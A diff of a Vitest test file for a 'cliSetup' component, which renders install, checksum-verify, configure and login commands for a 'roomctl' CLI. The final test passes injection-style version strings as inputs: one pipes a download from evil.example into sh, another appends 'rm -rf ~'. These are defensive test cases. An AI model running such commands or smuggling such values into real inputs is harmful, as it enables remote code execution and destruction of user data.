@@ -122,8 +122,10 @@ describe("cliSetup", () => {
     const d = cliSetup(get as unknown as typeof fetch);
     d.open = true;
     d.dispatchEvent(new Event("toggle"));
-    await vi.waitFor(() => expect(d.querySelector("pre")?.textContent).not.toBe(""));
-    return { get, text: d.querySelector("pre")!.textContent! };
+    await vi.waitFor(() => expect(d.querySelector(".cli-card")?.textContent).not.toBe(""));
+    // Each step's command sits in its own block; the steps read in order.
+    const blocks = [...d.querySelectorAll("pre")].map((p) => p.textContent!);
+    return { get, text: blocks.length ? blocks.join("\n") : d.querySelector(".cli-card")!.textContent! };
   };
   it("installs the broker's roomctl release, checksum verified, then configures and logs in (#48)", async () => {
     const { get, text } = await open({ ...values, version: "v0.7.0" });
@@ -133,20 +135,14 @@ describe("cliSetup", () => {
       `curl -fsSLO "$base/roomctl-$os-$arch" && curl -fsSLO "$base/roomctl.sha256"`,
       `command -v sha256sum >/dev/null && sum=sha256sum || sum="shasum -a 256"`,
       `grep " roomctl-$os-$arch$" roomctl.sha256 | $sum -c - && sudo install -m 0755 "roomctl-$os-$arch" /usr/local/bin/roomctl`,
-      "roomctl configure --url https://rooms.priv.example --issuer https://auth.example --client-id 3434@agents --project-id 29184",
+      "roomctl configure \\",
+      "  --url https://rooms.priv.example \\",
+      "  --issuer https://auth.example \\",
+      "  --client-id 3434@agents \\",
+      "  --project-id 29184",
       "roomctl login",
     ].join("\n"));
     expect(get).toHaveBeenCalledWith("/api/roomctl", expect.anything());
-  });
-  it("a local broker: configure by URL alone, no login, then roomctl run", async () => {
-    const { text } = await open({ url: "http://localhost:8080", issuer: "", clientID: "local", projectID: "local", version: "dev", humanMode: "local" });
-    const lines = text.split("\n");
-    expect(lines.slice(-2)).toEqual([
-      "roomctl configure --url http://localhost:8080",
-      "roomctl run --repo <owner/name> --task '<what the run should do>'",
-    ]);
-    expect(text).not.toContain("--client-id");
-    expect(text).not.toContain("roomctl login");
   });
   it("installs the latest release when the version is not a whole release semver, hostile ones included", async () => {
     for (const version of ["dev", undefined, `v1"; curl https://evil.example | sh #`, "v1.2.3\nrm -rf ~"]) {
